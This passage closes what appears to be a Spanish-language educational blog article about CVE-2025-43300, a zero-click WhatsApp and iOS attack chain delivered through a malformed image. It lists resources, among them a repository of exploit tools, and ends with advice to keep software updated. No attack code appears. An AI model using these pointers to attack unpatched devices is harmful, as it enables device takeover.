+<table><thead><tr><th align="left">Recurso</th><th align="left">Descripción</th></tr></thead><tbody><tr><td align="left"><a href="https://github.com/danielw98/zero-click-exploit-analysis"><code>zero-click-exploit-analysis</code></a></td><td align="left">Proyecto completo con paper, laboratorios interactivos y análisis de parches</td></tr><tr><td align="left"><a href="https://github.com/PwnToday/CVE-2025-43300">PwnToday/CVE-2025-43300</a></td><td align="left">Repositorio con herramientas Python para la vulnerabilidad</td></tr><tr><td align="left"><a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">Blog de Quarkslab</a></td><td align="left">Análisis técnico profundo del parche de Apple</td></tr><tr><td align="left"><a href="https://media.ccc.de/">Presentación DNGerousLINK (39C3)</a></td><td align="left">La charla completa de los investigadores</td></tr><tr><td align="left"><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43300">CVE-2025-43300 NVD Entry</a></td><td align="left">Información oficial de la vulnerabilidad</td></tr></tbody></table>
+<hr>
+<h2 id="-conclusión">🎯 Conclusión</h2>
+<p>Este ataque es un ejemplo perfecto de cómo <strong>la seguridad es una cadena</strong>: un eslabón débil en WhatsApp y otro en iOS se combinaron para crear una amenaza muy seria.</p>
+<p>Lo más impactante es que <strong>solo hacían falta 2 bytes</strong> en un archivo de imagen para comprometer un iPhone. Dos pequeños números. Y con eso, un atacante podía tomar el control total de tu dispositivo sin que hicieras nada.</p>
+<p>Por suerte, <strong>los equipos de seguridad de Apple y WhatsApp actuaron rápido</strong> y lanzaron parches antes de que el ataque se generalizara. Pero este caso nos recuerda que en el mundo digital, la seguridad es una carrera constante entre quienes protegen y quienes atacan.</p>
+<p>La lección más importante es simple pero poderosa: <strong>mantén tu software actualizado. Siempre.</strong></p>
+<hr>
+<blockquote>
+<p><em>“El ataque más peligroso es aquel del que no te enteras hasta que es demasiado tarde.”</em></p>
+</blockquote>
+<hr>
+<p><em>📝 Nota: Este artículo tiene fines educativos. Las vulnerabilidades descritas están parcheadas y no deben ser explotadas. El conocimiento de estos ataques nos ayuda a entender cómo protegernos y a apreciar la importancia de la seguridad en el software que usamos a diario.</em></p> </article> <div class="flex flex-wrap items-center justify-between gap-4 rounded-2xl border border-dashed border-gray-300 bg-white/70 p-6 dark:border-gray-800 dark:bg-gray-900/60"> <div> <h2 class="text-xl font-semibold text-gray-900 dark:text-white">
 ¿Quieres comentar algo?
 </h2> <p class="text-gray-700 dark:text-gray-200">
 Escríbeme si quieres que amplíe alguno de estos temas o tienes
